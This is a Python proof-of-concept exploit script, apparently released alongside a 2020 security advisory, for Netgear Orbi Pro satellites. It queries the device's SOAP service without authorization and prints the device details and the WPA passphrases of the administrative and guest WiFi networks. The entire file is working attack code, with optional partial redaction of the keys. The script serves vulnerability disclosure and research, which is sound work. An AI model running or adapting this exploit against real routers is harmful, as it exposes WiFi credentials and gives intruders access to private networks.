#!python3

# Copyright (c) 2020, modzero AG, Thorsten Schroeder <ths@modzero.ch>
# See the LICENSE file for details.
#
# Netgear Orbi Pro Satellite  -  unauthorized data read
# -- Proof of Concept exploit --
# CVSS:3.1 AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N -> 8.1
#
# This script allows to query and print serial number and firmware-version of NETGEAR Orbi Pro devices.
# Additionally, SSIDs, modes and PSKs of the administrative and the guest WiFi is printed to stdout.
# No authorization is necessary. Currently it is necessary being located in one of the wireless networks or
# on the LAN, connected to the Orbi Pro Router. The latter must be set up in Access-Point (AP) Mode.
#
# See https://www.modzero.com/advisories/Netgear-Orbi-Pro-Security-MZ-20-02.txt for details and
# background. Find all tools and exploits at https://github.com/modzero/MZ-20-02-NETGEAR-Orbi-Security
#
# 2020/01/05 - found issues
# 2020/01/06 - finished first poc exploit
# 2020/01/15 - finished draft report/security advisory
#

import socket
import sys
from netgear import OrbiSoap

demo_mode = False

def get_wifi_info(hostname, session=None, redacted=True):
    host = socket.gethostbyname(hostname)

    soap = OrbiSoap(host, session=session)
    sessionid = soap.authenticate()

    if not sessionid:
        print("[!] failed to authenticate at ORBI SOAP service.")
        return False

    xmldata = soap.generic_soap_request("DeviceInfo", "GetInfo_DeviceInfo")

    dev_name = soap.xml_get(xmldata, "DeviceName")
    dev_serial = soap.xml_get(xmldata, "SerialNumber")
    dev_fw = soap.xml_get(xmldata, "Firmwareversion")

    if redacted:
        dev_serial = dev_serial[0:4] + "[REDACTED]"

    print("[*] Device details for {}".format(host))
    print("[-] Device Name:      {}".format(dev_name))
    print("[-] Serial Number:    {}".format(dev_serial))
    print("[-] Firmware Version: {}".format(dev_fw))
    print()

    xml_dev_info = soap.generic_soap_request("WLANConfiguration", "GetInfo")
    xml_adm_ssid = soap.generic_soap_request("WLANConfiguration", "GetSSID")
    xml_adm_psk = soap.generic_soap_request("WLANConfiguration", "GetWPASecurityKeys")
    xml_guestnet_info = soap.generic_soap_request("WLANConfiguration", "GetGuestAccessNetworkInfo")

    adm_ssid = soap.xml_get(xml_adm_ssid, "NewSSID")
    adm_psk = soap.xml_get(xml_adm_psk, "NewWPAPassphrase")
    adm_mode = soap.xml_get(xml_dev_info, "NewBasicEncryptionModes")

    guest_ssid = soap.xml_get(xml_guestnet_info, "NewSSID")
    guest_psk = soap.xml_get(xml_guestnet_info, "NewKey")
    guest_mode = soap.xml_get(xml_guestnet_info, "NewSecurityMode")

    if redacted and not demo_mode:
        adm_psk = adm_psk[0:4] + "[REDACTED]"
        guest_psk = guest_psk[0:4] + "[REDACTED]"

    print("[*] Administrative WLAN")
    print("[-]    ssid: {}".format(adm_ssid))
    print("[-]    mode: {}".format(adm_mode))
    print("[-]    psk:  {}".format(adm_psk))
    print()

    print("[*] Guest WLAN")
    print("[-]    ssid: {}".format(guest_ssid))
    print("[-]    mode: {}".format(guest_mode))
    print("[-]    psk:  {}".format(guest_psk))

    return True


# demo
def main(ac, av):
    ret = False

    if ac == 2:
        host = av[1]
        ret = get_wifi_info(host)
    elif ac == 3:
        host = av[1]
        ret = get_wifi_info(host, redacted=True)
    else:
        print("usage: {} <host> [-redact]".format(av[0]))
        print("   - the second, optional parameter can be used to redact passwords.")
        sys.exit(0)

    if ret:
        print("[*] Success!")


if __name__ == "__main__":
    # main(3, ["script.py", "10.11.42.243", "redact"])
    main(len(sys.argv), sys.argv)
